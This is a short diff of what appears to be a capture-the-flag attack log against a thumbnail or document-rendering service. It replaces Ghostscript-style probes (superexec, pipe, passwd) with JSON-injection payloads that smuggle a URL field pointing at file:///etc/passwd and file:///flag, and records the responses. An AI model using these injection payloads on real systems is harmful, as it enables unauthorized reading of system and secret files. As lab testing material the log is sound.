@@ -1,29 +1,12 @@
 
-=== STATIC_CONTROL
-STATUS 200 BYTES 6460
-PDF_TEXT 
+=== control TARGET ''
+STATUS 200 TYPE image/png BYTES 12297 PNG True
+SAVED thumb_control.png
 
-=== DIRECT_PASSWD
-STATUS 200 BYTES 12204
-PDF_TEXT  Title:circle.eps
- LanguageLevel:1
+=== passwd TARGET '"},"URL":{"type":"string","value":"file:///etc/passwd'
+STATUS 200 TYPE image/png BYTES 12297 PNG True
+SAVED thumb_passwd.png
 
-=== SUPEREXEC_PASSWD
-STATUS 200 BYTES 12204
-PDF_TEXT  Title:circle.eps
- LanguageLevel:1
-
-=== SUPEREXEC_FLAG
-STATUS 200 BYTES 12204
-PDF_TEXT  Title:circle.eps
- LanguageLevel:1
-
-=== PIPE_FLAG
-STATUS 200 BYTES 12204
-PDF_TEXT  Title:circle.eps
- LanguageLevel:1
-
-=== SUPEREXEC_PIPE_FLAG
-STATUS 200 BYTES 12204
-PDF_TEXT  Title:circle.eps
- LanguageLevel:1
+=== flag TARGET '"},"URL":{"type":"string","value":"file:///flag'
+STATUS 200 TYPE image/png BYTES 12297 PNG True
+SAVED thumb_flag.png
